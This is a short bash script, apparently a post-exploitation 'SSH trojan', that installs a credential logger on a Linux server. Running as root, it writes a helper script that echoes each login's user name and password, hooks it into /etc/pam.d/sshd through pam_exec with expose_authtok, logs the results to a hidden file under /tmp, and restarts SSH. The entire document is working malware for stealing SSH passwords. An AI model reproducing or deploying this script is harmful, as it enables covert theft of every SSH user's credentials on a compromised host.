#!/bin/bash

filelog="/tmp/.log_sshtrojan1.txt"


if [[ $EUID -ne 0 ]]; then
    echo "You aren't root"
    exit 1
fi


if [[ -e $filelog ]]; then 
    echo "File $filelog was created."
else
    echo "Create file $filelog." 
    touch $filelog
fi

scriptpath="/usr/local/bin/sshlogininfo.sh"

if [[ -e $scriptpath ]]; then 
    echo "Script $scriptpath was created."
else
    echo "Create script $scriptpath." 
    touch $scriptpath
fi

cat > $scriptpath << EOF
#!/bin/bash
read PASSWORD
echo "Usr: \$PAM_USER"
echo "Passwd: \$PASSWORD"
EOF

chmod +x $scriptpath

sshdPamConfigPath="/etc/pam.d/sshd"
cat >> $sshdPamConfigPath << EOF
@include common-auth
#use module pam_exec to call an external command
auth       required     pam_exec.so     expose_authtok     seteuid     log=$filelog     $scriptpath
EOF

/etc/init.d/ssh restart
